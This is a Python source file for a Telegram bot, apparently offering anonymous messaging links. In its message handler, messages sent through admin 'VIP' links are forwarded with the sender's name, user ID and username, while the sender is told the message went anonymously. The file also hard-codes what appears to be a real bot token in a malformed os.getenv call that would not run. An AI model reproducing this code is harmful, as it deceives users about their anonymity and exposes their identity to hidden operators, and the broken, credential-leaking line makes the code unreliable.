import asyncio
import sqlite3
import time
import os

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import CommandStart

TOKEN = os.getenv("8714853815:AAGHOAzbFKDO6yUM7B0SVOaqAB5IAqpywsM)  # 👈 для Render

ADMIN_IDS = [8490781536, 5812315702]

VIP_REFS = {
    "kx92la": 8490781536,
    "mv81qp": 5812315702
}

bot = Bot(token=TOKEN)
dp = Dispatcher()

conn = sqlite3.connect("database.db", check_same_thread=False)
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT
)
""")
conn.commit()

last_messages = {}
user_targets = {}


# ================= START =================
@dp.message(CommandStart())
async def start(message: Message):
    user = message.from_user

    cursor.execute("""
    INSERT OR REPLACE INTO users (user_id, username, first_name)
    VALUES (?, ?, ?)
    """, (user.id, user.username, user.first_name))
    conn.commit()

    args = message.text.split(maxsplit=1)
    args = args[1] if len(args) > 1 else None

    if args:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✍️ Написать сообщение", callback_data=f"write_{args}")]
        ])

        await message.answer("Отправь сообщение 👇", reply_markup=kb)
        return

    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start={user.id}"

    text = f"""
👋 Привет!

Твоя анонимная ссылка:
{link}
"""

    for code, admin_id in VIP_REFS.items():
        if user.id == admin_id:
            vip_link = f"https://t.me/{me.username}?start={code}"
            text += f"\n🔥 VIP ссылка:\n{vip_link}"

    await message.answer(text)


# ================= CALLBACK =================
@dp.callback_query(F.data.startswith("write_"))
async def write(call: CallbackQuery):
    target = call.data.split("_", 1)[1]
    user_targets[call.from_user.id] = target
    await call.message.answer("✍️ Пиши сообщение")
    await call.answer()


# ================= MESSAGE =================
@dp.message()
async def handle(message: Message):
    user = message.from_user

    if message.text and message.text.startswith("/"):
        return

    if user.id not in user_targets:
        return

    now = time.time()

    if user.id in last_messages and now - last_messages[user.id] < 3:
        await message.answer("⏳ Подожди немного")
        return

    last_messages[user.id] = now

    target = user_targets[user.id]

    # VIP
    if target in VIP_REFS:
        admin_id = VIP_REFS[target]

        text = f"""
🔥 VIP сообщение

👤 {user.first_name}
🆔 {user.id}
@{user.username if user.username else "no_username"}

💬 {message.text}
"""

        await bot.send_message(admin_id, text)

    else:
        try:
            target_id = int(target)
        except:
            return

        await bot.send_message(target_id, f"💬 {message.text}")

    await message.answer("✅ Отправлено анонимно")
    del user_targets[user.id]


# ================= MAIN =================
async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    print("BOT STARTED")
    asyncio.run(main())